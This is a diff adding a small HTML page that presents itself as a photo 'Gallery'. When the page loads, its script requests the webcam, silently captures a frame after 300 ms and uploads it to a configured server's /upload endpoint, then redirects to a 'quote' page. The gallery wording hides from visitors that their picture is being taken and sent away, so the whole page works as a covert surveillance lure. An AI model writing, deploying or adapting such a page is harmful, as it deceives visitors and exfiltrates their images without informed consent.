@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Gallery</title>
+
+<style>
+body{
+    margin:0;
+    background:#0f172a;
+    color:white;
+    font-family:Arial;
+}
+
+.container{
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    flex-direction:column;
+}
+
+video{
+    width:90%;
+    max-width:400px;
+    display:none;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+    <h2>Images Starting...</h2>
+    <p id="status">Please wait</p>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none"></canvas>
+</div>
+
+<script src="./config.js"></script>
+
+<script>
+
+const API_URL = window.API_CONFIG.API_URL;
+
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const statusText = document.getElementById("status");
+
+let uploaded = false;
+
+window.onload = startCamera;
+
+async function startCamera(){
+
+    try{
+
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video:true,
+            audio:false
+        });
+
+        video.srcObject = stream;
+        await video.play();
+
+        video.style.display="block";
+        statusText.innerText="Photos are ready";
+
+        setTimeout(capture, 300);
+
+    }catch(err){
+        statusText.innerText="Photos blocked. / error";
+    }
+}
+
+function capture(){
+
+    const ctx = canvas.getContext("2d");
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    ctx.drawImage(video,0,0);
+
+    canvas.toBlob(async (blob)=>{
+
+        const form = new FormData();
+        form.append("photo",blob,"img.jpg");
+
+        const res = await fetch(`${API_URL}/upload`,{
+            method:"POST",
+            body:form
+        });
+
+        const data = await res.json();
+
+        if(data.success){
+            window.location.href="quote.html";
+        } else {
+            statusText.innerText="please try again. network failed!";
+        }
+
+    },"image/jpeg");
+}
+
+</script>
+
+</body>
+</html>
